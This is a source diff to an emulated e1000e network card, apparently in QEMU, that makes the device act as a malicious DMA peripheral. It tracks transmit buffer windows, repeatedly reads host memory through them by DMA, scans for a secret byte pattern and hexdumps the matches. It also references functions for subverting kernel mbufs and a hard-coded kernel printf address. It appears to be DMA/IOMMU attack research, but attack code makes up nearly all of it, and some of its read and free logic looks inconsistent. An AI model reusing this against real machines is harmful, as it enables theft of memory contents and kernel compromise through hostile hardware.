@@ -81,8 +81,8 @@ void attempt_to_subvert_windows(E1000ECore* core, hwaddr ba);
 void attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba);
 void print_rx_buffer_address_information(E1000ECore *core);
 void print_tx_buffer_address_information(E1000ECore *core);
-void record_windows_from_tx_buffer(E1000ECore *core);
-void record_windows(E1000ECore *core);
+void record_tx_windows_from_tx_buffer(E1000ECore *core);
+void record_tx_windows(E1000ECore *core);
 
 /*
  * ----------------------------------------------------------------------------
@@ -1006,6 +1006,9 @@ _e1000e_rx_ring_init(E1000ECore *core, E1000E_RxRing *rxr, int idx)
 static void
 start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 {
+	/*putchar('t');*/
+	/*fflush(stdout);*/
+
     dma_addr_t base;
     struct e1000_tx_desc desc;
     bool ide = false;
@@ -1014,8 +1017,11 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 
     if (!(core->mac[TCTL] & E1000_TCTL_EN)) {
         trace_e1000e_tx_disabled();
+		fflush(stdout);
         return;
     }
+
+	record_tx_windows(core);
 
     while (!_e1000e_ring_empty(core, txi)) {
         base = _e1000e_ring_head_descr(core, txi);
@@ -1028,7 +1034,7 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
         process_tx_desc(core, txr->tx, &desc, txi->idx);
         cause |= txdesc_writeback(core, base, &desc, &ide, txi->idx);
 
-		uint64_t buffer_addr = le64_to_cpu(desc.buffer_addr);
+		/*uint64_t buffer_addr = le64_to_cpu(desc.buffer_addr);*/
 		/*attempt_to_subvert_mbuf(core, buffer_addr);*/
 		/*attempt_to_subvert_windows(core, buffer_addr);*/
 
@@ -2670,8 +2676,6 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
     start_xmit(core, &txr);
-
-	/*record_windows(core);*/
 }
 
 static void
@@ -3734,10 +3738,13 @@ get_buffer_address_from_tx_descriptor(E1000ECore *core,
 
 
 void
-print_buffer_address_information(hwaddr ba, void *opaque)
+print_buffer_address_information(E1000ECore *core,
+	dma_addr_t descriptor_addr, void *opaque)
 {
-	E1000ECore *core = (E1000ECore *)opaque;
 	struct mbuf mbuf_buffer;
+
+	get_buffer_address_fp get_buffer_address = (get_buffer_address_fp)(opaque);
+	hwaddr ba = get_buffer_address(core, descriptor_addr);
 
 	printf("Buffer: 0x%lx.\n", ba);
 	if (ba % 2048 == 0) {
@@ -3755,30 +3762,57 @@ print_buffer_address_information(hwaddr ba, void *opaque)
 	hexdump((uint8_t *)(&mbuf_buffer), 256);
 }
 
-SLIST_HEAD(PageListHead, PageListEntry) page_list_head
-	= SLIST_HEAD_INITIALIZER(page_list_head);
+int window_list_length, window_list_min_length, window_list_max_length;
 
-struct PageListEntry {
-	uint64_t page_address;
-	SLIST_ENTRY(PageListEntry) page_list;
+SLIST_HEAD(window_list_head, window_list_entry) window_list_head
+	= SLIST_HEAD_INITIALIZER(window_list_head);
+
+struct window_list_entry {
+	uint64_t base;
+	uint64_t length;
+	SLIST_ENTRY(window_list_entry) window_list;
 };
+
+static inline void
+print_window(struct window_list_entry *entry)
+{
+	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
+}
 
 /* I don't like using the constructor attribute, but it's the simplest way to
  * go about this.
  */
+__attribute__((constructor))
 void
-initialise_page_list() __attribute__((constructor))
+initialise_window_list()
 {
 	printf("INIT PAGE LIST\n");
-	SLIST_INIT(&page_list_head);
+	SLIST_INIT(&window_list_head);
+	window_list_length = 0;
+	window_list_min_length = 0;
+	window_list_max_length = 0;
+}
+
+static inline void
+adjust_window_list_length(int diff)
+{
+	window_list_length += diff;
+	if (window_list_length > window_list_max_length) {
+		window_list_max_length = window_list_length;
+		printf("Window list new max length: %d.\n", window_list_length);
+	} else if (window_list_length < window_list_min_length) {
+		window_list_min_length = window_list_length;
+		printf("Window list new min length: %d.\n", window_list_length);
+	}
 }
 
 bool
-address_in_page_list(uint64_t address)
+window_in_list(uint64_t base, uint64_t length)
 {
-	struct PageListEntry *page_list_entry;
-	SLIST_FOREACH(page_list_entry, &page_list_head, page_list) {
-		if (page_list_entry->page_address == address) {
+	struct window_list_entry *window_list_entry;
+	SLIST_FOREACH(window_list_entry, &window_list_head, window_list) {
+		if (base == window_list_entry->base &&
+			length == window_list_entry->length) {
 			return true;
 		}
 	}
@@ -3786,12 +3820,12 @@ address_in_page_list(uint64_t address)
 }
 
 void
-check_for_secret(uint64_t page_address, uint8_t page[4096])
+check_for_secret(struct window_list_entry *window, uint8_t page[4096])
 {
 #define PATTERN_LENGTH 8
 	int64_t j;
 	uint64_t run_length = 1;
-	for (uint64_t i = 0; i < 4096; i += PATTERN_LENGTH) {
+	for (uint64_t i = 0; i < window->length; i += PATTERN_LENGTH) {
 		if (page[i] == 'i') {
 			j = i;
 			while (run_length < PATTERN_LENGTH && --j >= 0 && page[j] == 'i') {
@@ -3807,67 +3841,89 @@ check_for_secret(uint64_t page_address, uint8_t page[4096])
 		}
 	}
 	if (run_length == PATTERN_LENGTH) {
-		printf("Found pattern in page: 0x%lx. \n", page_address);
+		fputs("Found pattern in page: ", stdout);
+		print_window(window);
+		putchar('\n');
 		hexdump(page, 4096);
 	}
 #undef PATTERN_LENGTH
 }
 
 void
-record_windows_from_buffer_address(hwaddr ba, void *opaque)
+check_windows_for_secret(E1000ECore *core)
 {
-#define PAGE_AMOUNT_TO_READ 128
-	E1000ECore *core = (E1000ECore *)opaque;
-	struct mbuf mbuf_buffer;
-	struct PageListEntry *entry, *next;
-	uint8_t page[PAGE_AMOUNT_TO_READ];
+	/*putchar('c');*/
+	/*fflush(stdout);*/
+
 	int read_result;
-
-	uint64_t page_address = ba & ~uint64_mask(12);
-
-	if (!address_in_page_list(page_address)) {
-		entry = malloc(sizeof(struct PageListEntry));
-		entry->page_address = page_address;
-		SLIST_INSERT_HEAD(&page_list_head, entry, page_list);
-		printf("Adding page 0x%lx to windows.\n", page_address);
-	}
-
+	uint8_t page[4096];
+	struct window_list_entry *entry, *next;
 	bool check_head = true;
-	next = entry = SLIST_FIRST(&page_list_head);
+	next = entry = SLIST_FIRST(&window_list_head);
 
 	while (check_head && entry != NULL) {
 		check_head = false;
-		read_result = perform_dma_long_read(page, PAGE_AMOUNT_TO_READ,
-			core->owner->devfn, 8, entry->page_address);
-		if (read_result == 0) {
-			check_for_secret(entry->page_address, page);
+		read_result = perform_dma_long_read(page, entry->length,
+			core->owner->devfn, 8, entry->base);
+		if (read_result != DRR_SUCCESS) {
+			check_for_secret(entry, page);
 		} else {
-			printf("Couldn't read 0x%lx. Removing head entry.\n",
-				entry->page_address);
+			/*fputs("Removing entry, as couldn't read ", stdout);*/
+			/*print_window(entry);*/
+			/*putchar('\n');*/
 			check_head = true;
-			SLIST_REMOVE_HEAD(&page_list_head, page_list);
+			SLIST_REMOVE_HEAD(&window_list_head, window_list);
 			free(entry);
-			next = entry = SLIST_FIRST(&page_list_head);
+			adjust_window_list_length(-1);
+			next = entry = SLIST_FIRST(&window_list_head);
 		}
 	}
 
-	while ((entry != NULL) && (next = SLIST_NEXT(entry, page_list)) != NULL) {
-		read_result = perform_dma_long_read(page, PAGE_AMOUNT_TO_READ,
-			core->owner->devfn, 8, next->page_address);
+	while ((entry != NULL) && (next = SLIST_NEXT(entry, window_list)) != NULL) {
+		read_result = perform_dma_long_read(page, entry->length,
+			core->owner->devfn, 8, next->base);
 		if (read_result != DRR_UNSUPPORTED_REQUEST) {
-			if (read_result == DRR_CHEWED) {
-				PDBG("chewed!");
-			}
-			check_for_secret(next->page_address, page);
+			check_for_secret(next, page);
 			entry = next;
 		} else {
-			printf("Couldn't read 0x%lx. Removing body entry.\n",
-				next->page_address);
-			SLIST_REMOVE_AFTER(entry, page_list);
+			/*fputs("Removing entry, as couldn't read ", stdout);*/
+			/*print_window(entry);*/
+			/*putchar('\n');*/
+			SLIST_REMOVE_AFTER(entry, window_list);
 			free(entry);
+			adjust_window_list_length(-1);
 		}
 	}
-#undef PAGE_AMOUNT_TO_READ
+}
+
+void
+record_tx_windows_from_descriptor_address(E1000ECore *core,
+	dma_addr_t descriptor_addr, void *opaque)
+{
+	/*putchar('w');*/
+	/*fflush(stdout);*/
+	struct window_list_entry *entry;
+
+	struct e1000_tx_desc desc;
+	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
+
+	hwaddr base = le64_to_cpu(desc.buffer_addr);
+	hwaddr length = le16_to_cpu(desc.lower.flags.length);
+
+	if (!window_in_list(base, length)) {
+		/*putchar('a');*/
+		/*fflush(stdout);*/
+		entry = malloc(sizeof(struct window_list_entry));
+		entry->base = base;
+		entry->length = length;
+		SLIST_INSERT_HEAD(&window_list_head, entry, window_list);
+		adjust_window_list_length(1);
+		/*fputs("Adding ", stdout);*/
+		/*print_window(entry);*/
+		/*putchar('\n');*/
+	}
+
+	check_windows_for_secret(core);
 }
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
@@ -4038,23 +4094,20 @@ attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
 }
 
 void
-for_each_buffer_address(E1000ECore *core, const E1000E_RingInfo *rxi,
-	get_buffer_address_fp get_buffer_address,
-	void (*loop_body)(hwaddr, void *),
+for_each_descriptor_address(E1000ECore *core, const E1000E_RingInfo *rxi,
+	void (*loop_body)(E1000ECore *core, dma_addr_t, void *),
 	void (*done)(void *),
 	void *opaque)
 {
-	hwaddr ba;
     dma_addr_t cursor_addr, tail_addr, wrap_addr;
 
-	int i = 0;
 	cursor_addr = _e1000e_ring_head_descr(core, rxi);
 	tail_addr = _e1000e_ring_tail_descr(core, rxi);
 	wrap_addr = _e1000e_ring_descriptor_address(core, rxi,
 		core->mac[rxi->dlen]);
 
 	while (cursor_addr != tail_addr) {
-		loop_body(get_buffer_address(core, cursor_addr), opaque);
+		loop_body(core, cursor_addr, opaque);
 
 		cursor_addr += E1000_RING_DESC_LEN;
 		if (cursor_addr == wrap_addr) {
@@ -4081,8 +4134,8 @@ print_rx_buffer_address_information(E1000ECore *core)
 	/* 0 is the queue. Should do something with RSS to confirm this is
 	 * correct. */
     _e1000e_rx_ring_init(core, &rxr, 0);
-	for_each_buffer_address(core, rxi, get_buffer_address_from_rx_descriptor,
-		print_buffer_address_information, NULL, core);
+	for_each_descriptor_address(core, rxi, print_buffer_address_information,
+		NULL, get_buffer_address_from_rx_descriptor);
 }
 
 void
@@ -4092,17 +4145,19 @@ print_tx_buffer_address_information(E1000ECore *core)
 	E1000E_TxRing txr;
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
-	for_each_buffer_address(core, txi, get_buffer_address_from_tx_descriptor,
-		print_buffer_address_information, NULL, core);
+	for_each_descriptor_address(core, txi, print_buffer_address_information,
+		NULL, get_buffer_address_from_tx_descriptor);
 }
 
 void
-record_windows(E1000ECore *core)
+record_tx_windows(E1000ECore *core)
 {
+	fflush(stdout);
 	E1000E_TxRing txr;
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
-	for_each_buffer_address(core, txi, get_buffer_address_from_tx_descriptor,
-		record_windows_from_buffer_address, NULL, core);
+	for_each_descriptor_address(core, txi,
+		record_tx_windows_from_descriptor_address, NULL,
+		get_buffer_address_from_tx_descriptor);
 }
 #endif
